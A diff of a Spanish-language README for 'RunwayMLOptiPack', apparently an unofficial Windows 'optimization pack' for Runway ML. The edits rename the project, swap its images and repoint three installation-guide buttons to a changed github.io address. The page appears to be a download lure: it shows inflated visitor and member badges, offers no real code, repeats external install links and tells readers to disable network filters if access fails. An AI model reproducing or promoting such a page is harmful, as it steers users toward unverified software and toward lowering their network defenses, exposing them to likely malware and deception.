@@ -1,13 +1,13 @@
-# 🎨 RunwayMLOptiPack
+# 🎨 Runway ML Opti Pack
 
 ![Visitantes: 300K+](https://img.shields.io/badge/Visitantes-300K+-e74c3c) ![Miembros: 250K+](https://img.shields.io/badge/Miembros-250K+-6c5ce7) ![Actualizado](https://img.shields.io/badge/Actualizado-blue)
 
-![RunwayMLOptiPack Banner]()
+![RunwayMLOptiPack Banner](https://i.ytimg.com/vi/ZGU49rUMj20/maxresdefault.jpg)
 
 **Acerca de RunwayMLOptiPack**: RunwayMLOptiPack es un repositorio para usuarios de *Runway ML 2025* en Windows, con herramientas y configuraciones comunitarias para optimizar flujos de trabajo de IA generativa para creación de video, imagen y audio. Mejora el rendimiento, reduce tiempos de procesamiento y potencia resultados creativos para una experiencia fluida. ¡Con 300K+ visitantes y 250K+ miembros, eleva tus proyectos de IA hoy!
 
- <a href="https://runwayml-opti-comunidad.github.io/.github/" target="_blank">
-  <img src="https://img.shields.io/badge/Guía_de_instalación-Win_x32_x64-3498db" alt="Guía de Instalación" width="230" height="60" style="border:none;">
+ <a href="https://runway-ml-opti-comunidad.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Guía_de_instalación-Ahora-3498db" alt="Guía de Instalación" width="400" height="75" style="border:none;">
 </a>
 
 ---
@@ -22,8 +22,8 @@ Mejora tu *Runway ML 2025* con **RunwayMLOptiPack** en Windows:
 2. **Soluciona Problemas de Acceso** 🌐  
    Desactiva filtros de red o prueba navegadores como Edge o Firefox si es necesario.
 
- <a href="https://runwayml-opti-comunidad.github.io/.github/" target="_blank">
-  <img src="https://img.shields.io/badge/Guía_de_instalación-Win_x32_x64-3498db" alt="Guía de Instalación" width="230" height="60" style="border:none;">
+ <a href="https://runway-ml-opti-comunidad.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Guía_de_instalación-Ahora-3498db" alt="Guía de Instalación" width="400" height="75" style="border:none;">
 </a>
 
 ## 🛠 ¿Por qué RunwayMLOptiPack?
@@ -35,9 +35,10 @@ Mejora tu *Runway ML 2025* con **RunwayMLOptiPack** en Windows:
 - 🤝 **Comunidad Activa**: Conecta con 250K+ miembros.  
 - 📅 **Actualizaciones Frecuentes**: Nuevas herramientas para tus proyectos.
 
- <a href="https://runwayml-opti-comunidad.github.io/.github/" target="_blank">
-  <img src="https://img.shields.io/badge/Guía_de_instalación-Win_x32_x64-3498db" alt="Guía de Instalación" width="230" height="60" style="border:none;">
+ <a href="https://runway-ml-opti-comunidad.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Guía_de_instalación-Ahora-3498db" alt="Guía de Instalación" width="400" height="75" style="border:none;">
 </a>
+
 
 ## 🎨 Escenarios de Optimización
 
@@ -77,12 +78,12 @@ Mejora tu *Runway ML 2025* con **RunwayMLOptiPack** en Windows:
 ## 📸 Visuales
 
 **Interfaz de RunwayMLOptiPack**  
-![Interfaz](https://i.ytimg.com/vi/gt7WXqgs_SI/maxresdefault.jpg)  
-*Panel de optimización intuitivo.*
+![Interfaz](https://i.ytimg.com/vi/QNiMzCfjG1o/maxresdefault.jpg)  
+ 
 
 **Características de las Herramientas**  
-![Características](https://avatars.mds.yandex.net/i?id=f66dab7a0b508fb67e7cfa815c4697cf_l-5477655-images-thumbs&ref=rim&n=13&w=1260&h=709)  
-*Herramientas optimizadas para Runway ML.*
+![Características](https://young-boot-7b9904c2da.media.strapiapp.com/runway_image_651fcccfc9.jpg)  
+ 
 
 ---
 
